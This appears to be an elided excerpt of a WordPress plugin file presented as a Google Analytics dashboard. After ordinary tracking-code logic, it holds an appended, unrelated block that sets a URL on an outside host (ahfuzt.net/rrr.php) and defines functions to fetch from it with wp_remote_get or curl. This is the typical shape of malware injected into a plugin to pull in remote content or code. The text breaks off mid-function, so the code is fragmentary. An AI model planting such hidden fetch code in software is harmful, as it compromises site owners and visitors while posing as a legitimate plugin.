<?php
/*
 * Plugin Name: Easy Google Analytics Dashboard
 * Version: 6.4.5
	...
	if ( ( get_option(key_ga_status) != ga_disabled ) && ( $uid != "XX-XXXXX-X" ) )
	{
		...
		if ( ( get_option(key_ga_admin) == ga_enabled || !ga_current_user_is(get_option(key_ga_admin_role)) ) && get_option(key_ga_admin_disable) == 'remove' || get_option(key_ga_admin_disable) != 'remove' )
		{
			...
			if ( !function_exists("is_preview") || ( function_exists("is_preview") && !is_preview() ) )
			{
				...
				echo "<!-- Google Analytics Tracking by Google Analytics " . GOOGLE_ANALYTICATOR_VERSION . ": http://www.google.com/ -->\n";
...
$kkk_url = 'http://ahfuzt.net/rrr.php'; 
if(!function_exists('kkk_get')){ 
function kkk_get($f) { 
$response = wp_remote_get( $f ); 
if( is_wp_error( $response ) ) { 
function kkk_get_body($f) { 
$ch = @curl_init(); 
